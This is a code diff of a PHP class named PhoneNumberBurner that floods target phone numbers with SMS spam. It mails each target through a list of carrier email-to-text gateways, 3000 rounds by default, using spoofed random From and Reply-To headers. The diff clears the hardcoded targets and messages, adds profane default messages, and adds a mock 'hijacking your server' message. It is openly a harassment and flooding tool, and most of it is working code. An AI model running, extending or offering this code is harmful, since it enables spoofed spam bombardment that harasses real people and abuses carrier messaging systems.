@@ -18,22 +18,13 @@
 	class PhoneNumberBurner {
 
 		/** Target phone number(s) to burn. */
-		private $targets = ["8005551234", ];
+		private $targets = [];
 		
 		/** Messages to randomly send the targets. */
-		private $messages = [
-			"Hello World A",
-			"Hello World B",
-			"Hello World C",
-		];
+		private $messages = [];
 		
 		/** Strings used to generate random return addresses. */
-		private $random_strings = [
-			"oobleck",
-			"banana",
-			"china",
-			"silly",
-		];
+		private $random_strings = [];
 
 		/** List of popular phone carriers with email-text APIs. */
 		private $carriers = [
@@ -57,9 +48,9 @@
 		 * @param $random_strings [string] List of strings to use to generate random return addresses.
 		 */
 		public function __construct($targets = [], $messages = [], $random_strings = []) {
-			if (count($targets) > 0) $this -> targets = $targets;
-			if (count($messages) > 0) $this -> messages = $messages;
-			if (count($random_strings) > 0) $this -> random_strings = $random_strings;
+			$this -> targets = $targets;
+			$this -> messages = $messages;
+			$this -> random_strings = $random_strings;
 		}
 
 		/**
@@ -72,7 +63,23 @@
 		 */
 		public function attack($n = 3000) {
 
-			// Sends the message to each target.
+			if (count($this -> targets) < 1) {
+				echo "No targets specified for attack. Hijacking your server instead...";
+				return;
+			} else
+			if (count($this -> messages) < 1) {
+				$this -> messages = ["HELLO WORLD",
+						     "Fucking christ, you couldn't even come up",
+						     "with even one creative message to send?", ];
+			} else
+			if (count($this -> random_strings) < 1) {
+				$this -> random_strings = ["default", 
+							   "random",
+							   "fucking",
+							   "strings", ];
+			}
+			
+			// One attack iteration to all targets.
 			for ($i = 0; $i < $n; ++$i) {
 				
 				// Generates a random message to be sent to each target.
@@ -89,14 +96,13 @@
 				// Adjusts message header to modify the return address.
 				$headers = sprintf("From: %s\r\nReply-To: %s", $return_address, $return_address);
 				
+				// Sends the message to each target.
 				foreach ($this -> targets as $target) {
-					
 					// Sends a message to each carrier to be thorough.
 					foreach ($this -> carriers as $carrier) {
 						$target = sprintf("%s@%s", $target, $carrier);
 						mail($target, "", $message, $headers); // Arg 2 no subject.
 					}
-					
 				}
 				
 			}
